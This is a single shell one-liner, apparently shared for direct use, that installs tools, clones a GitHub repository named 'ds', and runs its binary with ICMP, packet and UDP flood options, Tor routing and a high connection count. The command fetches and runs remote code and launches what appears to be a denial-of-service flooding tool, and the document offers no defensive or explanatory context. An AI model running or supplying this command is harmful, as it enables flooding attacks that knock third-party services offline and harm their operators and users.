oneliner

apt update && apt install screen git vnstat nano -y && git clone https://github.com/serbianka07/ds.git && cd ds && chmod +x ds && cat ita.txt && screen -S "ds" ./ds --use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --disable-auto-update --use-tor 200 -c 20000 
